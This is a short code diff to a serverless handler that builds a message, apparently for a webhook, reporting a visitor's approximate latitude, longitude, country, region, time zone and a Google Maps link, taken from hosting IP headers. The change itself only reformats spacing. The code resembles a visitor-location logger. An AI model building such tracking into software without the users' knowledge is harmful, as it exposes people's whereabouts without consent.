@@ -26,7 +26,7 @@ export default async function handler(
         },
         {
           "title": "Detalhes de localização:",
-          "description": `Latitude:${req.headers['x-vercel-ip-latitude']}\nLongitude:${req.headers['x-vercel-ip-longitude']}\nPaís:${req.headers['x-vercel-ip-country']}\nRegião:${req.headers['x-vercel-ip-country-region']}\nTime zone:${req.headers['x-vercel-ip-timezone']}\nLocalização aproximada: https://www.google.com/maps/place/${req.headers['x-vercel-ip-latitude']},${req.headers['x-vercel-ip-longitude']}`,
+          "description": `Latitude: ${req.headers['x-vercel-ip-latitude']}\nLongitude: ${req.headers['x-vercel-ip-longitude']}\nPaís: ${req.headers['x-vercel-ip-country']}\nRegião: ${req.headers['x-vercel-ip-country-region']}\nTime zone: ${req.headers['x-vercel-ip-timezone']}\nLocalização aproximada: https://www.google.com/maps/place/${req.headers['x-vercel-ip-latitude']},${req.headers['x-vercel-ip-longitude']}`,
           "url": "https://www.google.com/maps/place/${latitude},${longitude}",
           "color": 34303
         },
